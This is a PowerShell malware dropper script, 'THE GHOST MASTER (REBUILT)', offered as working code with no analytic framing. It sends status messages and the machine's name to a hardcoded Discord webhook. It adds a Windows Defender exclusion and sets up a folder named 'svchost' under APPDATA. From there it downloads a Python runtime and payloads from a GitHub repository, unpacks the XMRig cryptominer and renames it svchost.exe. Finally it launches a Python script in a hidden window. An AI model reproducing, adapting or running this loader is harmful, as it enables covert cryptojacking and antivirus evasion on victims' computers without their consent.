# --- THE GHOST MASTER (REBUILT) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Clear the Deck
if (Test-Path $Path) { Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Python Landing (THE CRITICAL PART)
Send-Ghost "Downloading Core..."
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
try {
    Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
    Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
    Remove-Item "$Path\py.zip"
    Send-Ghost "Core Expanded Successfully."
} catch { Send-Ghost "FATAL: Core Download/Expand Failed: $_"; exit }

# 3. Payload Landing
Send-Ghost "Pulling Shadow Payloads..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"

Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"

if (Test-Path "$Path\UpdataData.bin") {
    Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    Send-Ghost "Shadow Payloads Armed."
} else { Send-Ghost "FATAL: Payload Download Failed."; exit }

# 4. Activation
Send-Ghost "Engaging Ghost Mode..."
$PY_EXEC = "$Path\python\pythonw.exe"
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null
# We skip full pip install for speed; WinServices.py will handle missing libs
Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
Send-Ghost "Engine Released. Check Telemetry."
